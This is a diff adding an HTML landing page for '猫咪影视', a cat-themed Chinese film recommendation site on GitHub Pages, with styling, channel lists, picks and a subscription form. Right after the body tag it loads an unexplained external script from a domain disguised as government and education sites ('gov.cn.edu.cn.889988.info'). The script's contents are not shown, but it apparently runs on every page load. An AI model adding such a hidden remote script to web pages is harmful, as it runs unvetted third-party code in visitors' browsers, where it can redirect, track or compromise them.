@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="description" content="猫咪影视（maomiyingshi-cn）是温馨治愈的影视资源导航与观影指南平台，专注治愈系片单、萌宠主题与口碑佳片推荐，助你轻松找到值得陪伴的好片。">
+<meta name="keywords" content="猫咪影视,maomiyingshi-cn,影视,治愈系,电影,电视剧,萌宠,在线观影,片单,观影指南">
+<meta name="robots" content="index,follow">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>猫咪影视 | maomiyingshi-cn 治愈系影视资源导航与观影指南</title>
+<meta property="og:type" content="website">
+<meta property="og:title" content="猫咪影视 | 治愈系影视资源导航与观影指南">
+<meta property="og:description" content="猫咪影视 maomiyingshi-cn，专注治愈系片单与萌宠主题影视导航，帮你找到值得陪伴的好片。">
+<meta property="og:url" content="https://maomiyingshi-cn.github.io">
+<meta property="og:site_name" content="猫咪影视">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="canonical" href="https://maomiyingshi-cn.github.io">
+<style>
+/* ===== 基础 ===== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","Hiragino Sans GB",sans-serif;
+  background:#fdf9f4;color:#3a2f2a;line-height:1.75;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+img,svg{max-width:100%;display:block}
+:root{
+  --primary:#ff8fa3;--primary2:#ffb3a7;--warm:#ffd5a0;
+  --accent:#7ec8e3;--deep:#5b4a55;--ink:#3a2f2a;
+  --muted:#8b7d78;--card:#ffffff;--line:#f0e2da;
+  --shadow:0 12px 32px rgba(120,70,60,.10);--radius:20px;
+}
+::selection{background:var(--primary);color:#fff}
+body{background-image:radial-gradient(circle at 12% 8%,rgba(255,143,163,.10),transparent 42%),radial-gradient(circle at 88% 18%,rgba(126,200,227,.10),transparent 40%);background-attachment:fixed}
+
+/* ===== 布局容器 ===== */
+.wrap{max-width:1160px;margin:0 auto;padding:0 22px}
+
+/* ===== 顶栏 ===== */
+.header{position:sticky;top:0;z-index:100;background:rgba(253,249,244,.88);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.header-in{max-width:1160px;margin:0 auto;padding:14px 22px;display:flex;align-items:center;gap:24px}
+.logo{display:flex;align-items:center;gap:12px;font-size:21px;font-weight:900;color:var(--deep);letter-spacing:.5px;flex-shrink:0}
+.logo b{width:42px;height:42px;border-radius:14px;background:linear-gradient(135deg,var(--primary),var(--warm));display:grid;place-items:center;font-size:22px;box-shadow:0 6px 16px rgba(255,143,163,.4)}
+.nav{display:flex;gap:4px;margin-left:auto;align-items:center}
+.nav a{padding:9px 15px;border-radius:12px;font-size:15px;font-weight:600;color:var(--muted);transition:.2s}
+.nav a:hover{color:var(--deep);background:rgba(255,143,163,.12)}
+.nav .pill{margin-left:8px;padding:10px 22px;border-radius:22px;background:linear-gradient(135deg,var(--primary),var(--warm));color:#fff;font-weight:800;transition:.25s;box-shadow:0 6px 18px rgba(255,143,163,.4)}
+.nav .pill:hover{transform:translateY(-2px);box-shadow:0 10px 26px rgba(255,143,163,.55);color:#fff}
+.mob-btn{display:none;margin-left:auto;width:44px;height:44px;border-radius:13px;background:var(--card);border:1px solid var(--line);font-size:21px;cursor:pointer;color:var(--deep)}
+
+/* ===== Hero ===== */
+.hero{padding:96px 0 78px;position:relative;text-align:center;overflow:hidden}
+.hero h1{font-size:clamp(34px,6.5vw,64px);font-weight:900;line-height:1.18;letter-spacing:-.8px;color:var(--deep)}
+.hero h1 em{font-style:normal;background:linear-gradient(100deg,var(--primary),var(--warm) 55%,var(--accent));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero .lead{margin:24px auto 0;max-width:640px;color:var(--muted);font-size:clamp(15px,2.2vw,18.5px)}
+.chips{margin-top:34px;display:flex;gap:10px;justify-content:center;flex-wrap:wrap}
+.chip{padding:7px 18px;border-radius:22px;background:var(--card);border:1px solid var(--line);font-size:14px;font-weight:600;color:var(--deep);box-shadow:0 4px 14px rgba(120,70,60,.05)}
+.chips .chip:nth-child(2){background:linear-gradient(135deg,var(--primary),var(--warm));color:#fff;border-color:transparent}
+.hero-btns{margin-top:38px;display:flex;gap:14px;justify-content:center;flex-wrap:wrap}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:15px 34px;border-radius:14px;font-size:16px;font-weight:800;cursor:pointer;border:1px solid transparent;transition:.25s}
+.btn-p{background:linear-gradient(135deg,var(--primary),var(--warm));color:#fff;box-shadow:0 10px 28px rgba(255,143,163,.42)}
+.btn-p:hover{transform:translateY(-3px);box-shadow:0 16px 36px rgba(255,143,163,.55)}
+.btn-o{background:var(--card);color:var(--deep);border-color:var(--line)}
+.btn-o:hover{transform:translateY(-3px);box-shadow:var(--shadow)}
+.hero-float{display:flex;gap:18px;justify-content:center;flex-wrap:wrap;margin-top:52px}
+.float-card{flex:1;min-width:180px;max-width:240px;padding:22px;border-radius:var(--radius);background:var(--card);border:1px solid var(--line);box-shadow:var(--shadow);text-align:left}
+.float-card .n{font-size:27px;font-weight:900;color:var(--primary)}
+.float-card span{display:block;font-size:13.5px;color:var(--muted);margin-top:4px}
+
+/* ===== 通用区块 ===== */
+section{padding:78px 0;position:relative}
+.eyebrow{display:inline-block;padding:5px 15px;border-radius:20px;background:rgba(255,143,163,.14);color:var(--primary);font-size:12.5px;font-weight:800;letter-spacing:2px}
+.sec-title{font-size:clamp(26px,4.6vw,42px);font-weight:900;color:var(--deep);margin:10px 0 12px;letter-spacing:-.4px}
+.sec-desc{color:var(--muted);max-width:600px;font-size:15.5px}
+.sec-head{margin-bottom:50px}
+
+/* ===== 频道 ===== */
+.channel-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:22px}
+.channel{padding:30px 26px;border-radius:var(--radius);background:var(--card);border:1px solid var(--line);box-shadow:var(--shadow);transition:.32s;position:relative;overflow:hidden}
+.channel:hover{transform:translateY(-7px) rotate(-.3deg);box-shadow:0 24px 48px rgba(120,70,60,.16)}
+.channel .emoji{font-size:34px;display:block;margin-bottom:14px}
+.channel h3{font-size:21px;color:var(--deep);margin-bottom:8px}
+.channel p{color:var(--muted);font-size:14.5px;margin-bottom:16px}
+.channel .go{font-size:14px;font-weight:800;color:var(--primary);display:inline-flex;align-items:center;gap:5px}
+.channel:hover .go{gap:9px}
+
+/* ===== 今日推荐（横向滚动卡片） ===== */
+.today{background:linear-gradient(180deg,#fff7ef,#fdf9f4)}
+.scroll-row{display:grid;grid-auto-flow:column;grid-auto-columns:minmax(260px,280px);gap:20px;overflow-x:auto;scroll-snap-type:x mandatory;padding:6px 4px 22px;scrollbar-width:thin}
+.scroll-row::-webkit-scrollbar{height:8px}
+.scroll-row::-webkit-scrollbar-thumb{background:var(--primary2);border-radius:8px}
+.rec{scroll-snap-align:start;border-radius:var(--radius);overflow:hidden;background:var(--card);border:1px solid var(--line);box-shadow:var(--shadow);transition:.3s}
+.rec:hover{transform:translateY(-6px)}
+.rec .thumb{aspect-ratio:4/3;display:grid;place-items:center;font-size:40px;color:#fff;position:relative}
+.rec .badge{position:absolute;top:12px;left:12px;background:rgba(255,255,255,.92);color:var(--deep);padding:4px 11px;border-radius:20px;font-size:12px;font-weight:800}
+.rec .body{padding:18px}
+.rec h4{font-size:18px;color:var(--deep);margin-bottom:6px}
+.rec p{font-size:13.5px;color:var(--muted)}
+
+/* ===== 为什么选我们（图标块） ===== */
+.why-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:20px}
+.why{display:flex;gap:16px;padding:24px;border-radius:var(--radius);background:var(--card);border:1px solid var(--line);transition:.3s;align-items:flex-start}
+.why:hover{border-color:rgba(255,143,163,.5);box-shadow:var(--shadow)}
+.why .ic{flex-shrink:0;width:48px;height:48px;border-radius:14px;background:linear-gradient(135deg,var(--primary),var(--warm));display:grid;place-items:center;font-size:22px;color:#fff}
+.why h4{font-size:17.5px;color:var(--deep);margin-bottom:4px}
+.why p{font-size:14px;color:var(--muted)}
+
+/* ===== 精选片单（交替布局） ===== */
+.picks{background:linear-gradient(180deg,#fdf9f4,#fef4f7)}
+.pick-list{display:flex;flex-direction:column;gap:30px}
+.pick{display:grid;grid-template-columns:200px 1fr;gap:26px;padding:26px;border-radius:var(--radius);background:var(--card);border:1px solid var(--line);box-shadow:var(--shadow);align-items:center;transition:.3s}
+.pick:nth-child(even){grid-template-columns:1fr 200px}
+.pick:nth-child(even) .pick-cover{order:2}
+.pick:hover{transform:translateX(5px)}
+.pick-cover{aspect-ratio:1;border-radius:16px;display:grid;place-items:center;font-size:56px;color:#fff}
+.pick h4{font-size:21px;color:var(--deep);margin-bottom:8px}
+.pick p{color:var(--muted);font-size:14.5px;margin-bottom:12px}
+.pick .tags{display:flex;gap:8px;flex-wrap:wrap}
+.pick .tags i{font-style:normal;padding:4px 12px;border-radius:16px;background:rgba(126,200,227,.14);color:#3d7f9a;font-size:12.5px;font-weight:600}
+
+/* ===== 关于 ===== */
+.about-grid{display:grid;grid-template-columns:1fr 1fr;gap:54px;align-items:center}
+.about-txt h2{font-size:clamp(26px,4vw,38px);font-weight:900;color:var(--deep);line-height:1.3;margin-bottom:18px}
+.about-txt p{color:var(--muted);font-size:15.5px;margin-bottom:14px}
+.about-txt .urlbox{margin-top:18px;padding:14px 18px;border-radius:12px;background:rgba(126,200,227,.12);border:1px dashed rgba(126,200,227,.5);color:#3d7f9a;font-size:14px;font-weight:700;word-break:break-all}
+.about-visual{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.about-visual .cell{padding:26px;border-radius:var(--radius);background:var(--card);border:1px solid var(--line);box-shadow:var(--shadow);text-align:center}
+.about-visual .cell b{display:block;font-size:30px;font-weight:900;background:linear-gradient(100deg,var(--primary),var(--accent));-webkit-background-clip:text;background-clip:text;color:transparent}
+.about-visual .cell span{color:var(--muted);font-size:13.5px}
+
+/* ===== 订阅 ===== */
+.subscribe{text-align:center;padding:74px 0}
+.sub-card{max-width:600px;margin:0 auto;padding:46px 34px;border-radius:28px;background:linear-gradient(135deg,#fff5f7,#fff8ec);border:1px solid var(--line);box-shadow:0 24px 56px rgba(255,143,163,.22)}
+.sub-card h2{font-size:clamp(24px,4.2vw,36px);font-weight:900;color:var(--deep)}
+.sub-card p{color:var(--muted);margin:14px 0 28px}
+.sub-form{display:flex;gap:10px;background:var(--card);border:1px solid var(--line);border-radius:16px;padding:7px;box-shadow:0 8px 22px rgba(120,70,60,.07)}
+.sub-form input{flex:1;border:none;outline:none;background:none;padding:12px 14px;font-size:15px;color:var(--deep);min-width:0}
+.sub-form input::placeholder{color:#c2b3ad}
+.sub-form button{border:none;background:linear-gradient(135deg,var(--primary),var(--warm));color:#fff;padding:0 28px;border-radius:11px;font-weight:800;font-size:15px;cursor:pointer;transition:.2s;flex-shrink:0}
+.sub-form button:hover{filter:brightness(1.1)}
+
+/* ===== 页脚 ===== */
+.footer{border-top:1px solid var(--line);padding:56px 0 28px;background:#fffaf6}
+.foot-grid{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:36px}
+.foot-brand .logo{margin-bottom:14px}
+.foot-brand p{color:var(--muted);font-size:14.5px}
+.foot-grid h5{font-size:15.5px;color:var(--deep);margin-bottom:16px}
+.foot-grid ul li{margin-bottom:10px}
+.foot-grid a{color:var(--muted);font-size:14.5px;transition:.2s}
+.foot-grid a:hover{color:var(--primary)}
+.copyright{max-width:1160px;margin:36px 22px 0;padding-top:22px;border-top:1px solid var(--line);display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;color:var(--muted);font-size:13px}
+
+/* ===== 返回顶部 ===== */
+.top{position:fixed;right:20px;bottom:-64px;width:48px;height:48px;border-radius:15px;background:var(--card);border:1px solid var(--line);box-shadow:var(--shadow);color:var(--deep);font-size:19px;cursor:pointer;z-index:99;transition:.3s;display:grid;place-items:center}
+.top.show{bottom:24px}
+
+/* ===== 响应式 ===== */
+@media(max-width:900px){
+  .about-grid{grid-template-columns:1fr;gap:36px}
+  .foot-grid{grid-template-columns:1fr 1fr;gap:28px}
+}
+@media(max-width:720px){
+  .nav{position:fixed;top:72px;left:0;right:0;flex-direction:column;padding:20px;background:#fffaf6;border-bottom:1px solid var(--line);transform:translateY(-130%);opacity:0;pointer-events:none;transition:.32s;gap:4px;box-shadow:0 20px 40px rgba(120,70,60,.12)}
+  .nav.open{transform:translateY(0);opacity:1;pointer-events:auto}
+  .nav a{width:100%;text-align:center;padding:14px}
+  .nav .pill{margin:8px 0 0;width:100%;text-align:center}
+  .mob-btn{display:grid;place-items:center}
+  section{padding:60px 0}
+  .hero{padding:66px 0 54px}
+  .pick,.pick:nth-child(even){grid-template-columns:1fr}
+  .pick:nth-child(even) .pick-cover{order:0}
+  .pick-cover{aspect-ratio:16/9;font-size:44px}
+  .sub-card{padding:36px 22px}
+  .sub-form{flex-direction:column;padding:12px}
+  .sub-form button{padding:14px}
+  .foot-grid{grid-template-columns:1fr}
+}
+@media(max-width:420px){
+  .float-card{min-width:140px}
+  .scroll-row{grid-auto-columns:80%}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<header class="header">
+  <div class="header-in">
+    <a class="logo" href="#top"><b>🐱</b>猫咪影视</a>
+    <nav class="nav" id="nav">
+      <a href="#channels">频道</a>
+      <a href="#today">今日推荐</a>
+      <a href="#why">特色</a>
+      <a href="#picks">精选片单</a>
+      <a href="#about">关于</a>
+      <a class="pill" href="#sub">订阅片单</a>
+    </nav>
+    <button class="mob-btn" id="mobBtn" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<main id="top">
+
+  <!-- Hero -->
+  <section class="hero">
+    <div class="wrap">
+      <h1>陪你一起，<em>慢慢看好片</em></h1>
+      <p class="lead">猫咪影视 maomiyingshi-cn 是一个温暖的影视资源导航与观影指南平台，专注治愈系片单、萌宠主题与口碑佳片，让每一段独处时光都有好片陪伴。</p>
+      <div class="chips">
+        <span class="chip">🐾 治愈系精选</span>
+        <span class="chip">🎬 每日更新</span>
+        <span class="chip">🐱 萌宠主题</span>
+        <span class="chip">⭐ 口碑优先</span>
+      </div>
+      <div class="hero-btns">
+        <a class="btn btn-p" href="#today">开始看片 ▸</a>
+        <a class="btn btn-o" href="#channels">浏览频道</a>
+      </div>
+      <div class="hero-float">
+        <div class="float-card"><div class="n">9,800+</div><span>收录影视条目</span></div>
+        <div class="float-card"><div class="n">280+</div><span>治愈系片单</span></div>
+        <div class="float-card"><div class="n">每日</div><span>新鲜上线速递</span></div>
+        <div class="float-card"><div class="n">零广告</div><span>纯净浏览体验</span></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 频道 -->
+  <section id="channels">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="eyebrow">CHANNELS</span>
+        <h2 class="sec-title">内容频道</h2>
+        <p class="sec-desc">猫咪影视按心情与题材划分频道，想看什么类型，点开就是一片温柔的小天地。</p>
+      </div>
+      <div class="channel-grid">
+        <a class="channel" href="#">
+          <span class="emoji">🎬</span>
+          <h3>治愈电影</h3>
+          <p>温暖、轻松、充满善意的电影合集，适合疲惫时窝在沙发里慢慢看。</p>
+          <span class="go">进入频道 →</span>
+        </a>
+        <a class="channel" href="#">
+          <span class="emoji">🐾</span>
+          <h3>萌宠主题</h3>
+          <p>关于猫猫狗狗的电影与纪录片，吸猫吸狗停不下来的专属频道。</p>
+          <span class="go">进入频道 →</span>
+        </a>
+        <a class="channel" href="#">
+          <span class="emoji">📺</span>
+          <h3>陪伴剧集</h3>
+          <p>不费脑、节奏轻快的剧集，适合下班后放松，一集接一集停不下来。</p>
+          <span class="go">进入频道 →</span>
+        </a>
+        <a class="channel" href="#">
+          <span class="emoji">🌿</span>
+          <h3>自然纪录</h3>
+          <p>山川湖海、四季流转，用纪录片打开一个安静而辽阔的世界。</p>
+          <span class="go">进入频道 →</span>
+        </a>
+        <a class="channel" href="#">
+          <span class="emoji">😂</span>
+          <h3>解压综艺</h3>
+          <p>笑点密集的轻松综艺，三分钟就能把坏心情赶跑。</p>
+          <span class="go">进入频道 →</span>
+        </a>
+        <a class="channel" href="#">
+          <span class="emoji">⭐</span>
+          <h3>高分榜单</h3>
+          <p>多平台高分榜联动精选，把好口碑的宝藏影片一个个挖出来。</p>
+          <span class="go">进入频道 →</span>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 今日推荐 -->
+  <section id="today" class="today">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="eyebrow">TODAY PICKS</span>
+        <h2 class="sec-title">今日推荐</h2>
+        <p class="sec-desc">编辑今日精选，左右滑动查看更多 →</p>
+      </div>
+      <div class="scroll-row">
+
+        <article class="rec">
+          <div class="thumb" style="background:linear-gradient(135deg,#ff9a76,#ff6f91)">
+            <span class="badge">本周热门</span>🐱
+          </div>
+          <div class="body">
+            <h4>九条命的旅行</h4>
+            <p>一只走失的家猫穿越三座城市的温暖旅程，治愈系必看。</p>
+          </div>
+        </article>
+
+        <article class="rec">
+          <div class="thumb" style="background:linear-gradient(135deg,#7ec8e3,#6fb1fc)">
+            <span class="badge">新上线</span>🌊
+          </div>
+          <div class="body">
+            <h4>海边的猫咖啡馆</h4>
+            <p>海边小镇里的人与猫，把日常过成一首温柔的诗。</p>
+          </div>
+        </article>
+
+        <article class="rec">
+          <div class="thumb" style="background:linear-gradient(135deg,#a18cd1,#fbc2eb)">
+            <span class="badge">高分 9.4</span>🍃
+          </div>
+          <div class="body">
+            <h4>小森林的味道</h4>
+            <p>四季轮转中的餐桌与乡居生活，看完想种一盆薄荷。</p>
+          </div>
+        </article>
+
+        <article class="rec">
+          <div class="thumb" style="background:linear-gradient(135deg,#ffd5a0,#ff9a76)">
+            <span class="badge">萌宠向</span>🐶
+          </div>
+          <div class="body">
+            <h4>我和汪星人的约定</h4>
+            <p>一段跨越四季的人宠陪伴，让泪点与笑点同时到达。</p>
+          </div>
+        </article>
+
+        <article class="rec">
+          <div class="thumb" style="background:linear-gradient(135deg,#84fab0,#8fd3f4)">
+            <span class="badge">自然纪录</span>🌸
+          </div>
+          <div class="body">
+            <h4>花开的声音</h4>
+            <p>微距镜头下的四季花田，安静又治愈的真实世界。</p>
+          </div>
+        </article>
+
+        <article class="rec">
+          <div class="thumb" style="background:linear-gradient(135deg,#fccb90,#d57eeb)">
+            <span class="badge">轻松综艺</span>🎤
+          </div>
+          <div class="body">
+            <h4>来我家吃饭吧</h4>
+            <p>明星上真人家中做饭做客，烟火气满满的暖心综艺。</p>
+          </div>
+        </article>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- 特色 -->
+  <section id="why">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="eyebrow">WHY MAOMIYINGSHI</span>
+        <h2 class="sec-title">为什么选猫咪影视</h2>
+        <p class="sec-desc">不追求信息轰炸，只想把最舒服的内容，用最省力的方式送到你面前。</p>
+      </div>
+      <div class="why-grid">
+        <div class="why"><div class="ic">🐾</div><div><h4>治愈系取向</h4><p>每一份推荐都经过温柔筛选，避开重口味与过度刺激。</p></div></div>
+        <div class="why"><div class="ic">🎯</div><div><h4>按心情选片</h4><p>不想看、适合独处、陪家人看，按场景与情绪精准推荐。</p></div></div>
+        <div class="why"><div class="ic">📅</div><div><h4>上线日历</h4><p>新片新剧上线时间一目了然，再也不怕错过首播。</p></div></div>
+        <div class="why"><div class="ic">🚫</div><div><h4>零广告打扰</h4><p>没有弹窗与诱导，界面干净得像刚晒过太阳的被单。</p></div></div>
+        <div class="why"><div class="ic">📱</div><div><h4>全端自适应</h4><p>手机、平板、电脑都好看，通勤路上随手就能翻片单。</p></div></div>
+        <div class="why"><div class="ic">💬</div><div><h4>真实口碑聚合</h4><p>多平台评分与评论综合呈现，快速判断是否值得看。</p></div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 精选片单 -->
+  <section id="picks" class="picks">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="eyebrow">EDITOR'S PICKS</span>
+        <h2 class="sec-title">精选片单</h2>
+        <p class="sec-desc">编辑团队用心整理的主题合集，每一份都值得收藏。</p>
+      </div>
+      <div class="pick-list">
+
+        <div class="pick">
+          <div class="pick-cover" style="background:linear-gradient(135deg,#ff9a76,#ff6f91)">🐱</div>
+          <div>
+            <h4>下雨天也要看 10 部萌宠片</h4>
+            <p>阴雨天不想出门？这 10 部关于猫猫狗狗的影片，让你窝在被子里笑出声。</p>
+            <div class="tags"><i>萌宠</i><i>喜剧</i><i>治愈</i><i>10 部</i></div>
+          </div>
+        </div>
+
+        <div class="pick">
+          <div class="pick-cover" style="background:linear-gradient(135deg,#a18cd1,#fbc2eb)">🌿</div>
+          <div>
+            <h4>焦虑退散 · 慢节奏生活片单</h4>
+            <p>节奏舒缓、画面干净，适合把手机放下、认真看完一整部电影的时刻。</p>
+            <div class="tags"><i>慢节奏</i><i>生活</i><i>治愈</i><i>8 部</i></div>
+          </div>
+        </div>
+
+        <div class="pick">
+          <div class="pick-cover" style="background:linear-gradient(135deg,#7ec8e3,#6fb1fc)">🌊</div>
+          <div>
+            <h4>陪家人一起看的周末合集</h4>
+            <p>全年龄友好、无删减顾虑，周末一家人围坐看片的安心选择。</p>
+            <div class="tags"><i>合家欢</i><i>动画</i><i>冒险</i><i>12 部</i></div>
+          </div>
+        </div>
+
+        <div class="pick">
+          <div class="pick-cover" style="background:linear-gradient(135deg,#84fab0,#8fd3f4)">🍃</div>
+          <div>
+            <h4>把自然纪录片当助眠</h4>
+            <p>画质绝美、配乐舒缓，既是知识片也是最好的睡前背景音。</p>
+            <div class="tags"><i>自然</i><i>纪录</i><i>助眠</i><i>6 部</i></div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- 关于 -->
+  <section id="about">
+    <div class="wrap">
+      <div class="about-grid">
+        <div class="about-txt">
+          <span class="eyebrow">ABOUT</span>
+          <h2>关于猫咪影视</h2>
+          <p>猫咪影视（maomiyingshi-cn）是一个以"温柔陪伴"为出发点的影视资源导航与观影指南平台。我们相信，好电影像一只愿意蹭你手背的猫——不喧哗，却刚好在你需要时出现。</p>
+          <p>从治愈系片单到萌宠主题合集，从上线日历到多平台口碑聚合，猫咪影视只想做一件事：让你的每一次打开，都遇见一部值得陪伴的好片。</p>
+          <div class="urlbox">🌐 站点地址：https://maomiyingshi-cn.github.io</div>
+        </div>
+        <div class="about-visual">
+          <div class="cell"><b>9,800+</b><span>收录影视条目</span></div>
+          <div class="cell"><b>280+</b><span>主题片单</span></div>
+          <div class="cell"><b>6 个</b><span>内容频道</span></div>
+          <div class="cell"><b>99%</b><span>纯净无广告</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 订阅 -->
+  <section id="sub" class="subscribe">
+    <div class="wrap">
+      <div class="sub-card">
+        <h2>把片单，轻轻推到你面前 🐾</h2>
+        <p>每周一封温柔邮件，送上猫咪影视精选片单与上线提醒，可随时退订，绝不打扰。</p>
+        <form class="sub-form" onsubmit="event.preventDefault();var b=this.querySelector('button');b.textContent='已订阅 ✓';this.querySelector('input').value='';">
+          <input type="email" placeholder="输入你的邮箱地址" required>
+          <button type="submit">免费订阅</button>
+        </form>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer class="footer">
+  <div class="wrap">
+    <div class="foot-grid">
+      <div class="foot-brand">
+        <a class="logo" href="#top"><b>🐱</b>猫咪影视</a>
+        <p>陪你一起，慢慢看好片。专注治愈系影视资源导航与观影指南的温暖平台。</p>
+      </div>
+      <div>
+        <h5>内容频道</h5>
+        <ul>
+          <li><a href="#channels">治愈电影</a></li>
+          <li><a href="#channels">萌宠主题</a></li>
+          <li><a href="#channels">陪伴剧集</a></li>
+          <li><a href="#channels">自然纪录</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>站内导航</h5>
+        <ul>
+          <li><a href="#today">今日推荐</a></li>
+          <li><a href="#why">特色介绍</a></li>
+          <li><a href="#picks">精选片单</a></li>
+          <li><a href="#about">关于我们</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>联系我们</h5>
+        <ul>
+          <li><a href="#">投稿与推荐</a></li>
+          <li><a href="#">商务合作</a></li>
+          <li><a href="#">意见反馈</a></li>
+          <li><a href="#">免责声明</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copyright">
+      <span>© 2026 猫咪影视 maomiyingshi-cn. 保留所有权利。</span>
+      <span>网站网址：https://maomiyingshi-cn.github.io</span>
+    </div>
+  </div>
+</footer>
+
+<div class="top" id="topBtn" aria-label="返回顶部">↑</div>
+
+<script>
+var topBar=document.createElement('div');
+topBar.style.cssText='position:fixed;top:0;left:0;height:3px;width:0;background:linear-gradient(90deg,#ff8fa3,#ffd5a0);z-index:9999;transition:width .15s';
+document.body.prepend(topBar);
+
+var btn=document.getElementById('topBtn');
+window.addEventListener('scroll',function(){
+  var h=document.documentElement.scrollHeight-innerHeight;
+  topBar.style.width=(h>0?(scrollY/h*100):0)+'%';
+  btn.classList[scrollY>500?'add':'remove']('show');
+},false);
+btn.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+
+var mob=document.getElementById('mobBtn'),nav=document.getElementById('nav');
+mob.addEventListener('click',function(){nav.classList.toggle('open');});
+nav.addEventListener('click',function(e){if(e.target.tagName==='A')nav.classList.remove('open');});
+
+var secs=document.querySelectorAll('section[id]');
+var navAs=document.querySelectorAll('.nav a');
+window.addEventListener('scroll',function(){
+  var cur='';
+  secs.forEach(function(s){if(scrollY>=s.offsetTop-130)cur=s.id;});
+  navAs.forEach(function(a){a.style.color=a.getAttribute('href')==='#'+cur?'#3a2f2a':'';});
+},false);
+</script>
+
+</body>
+</html>
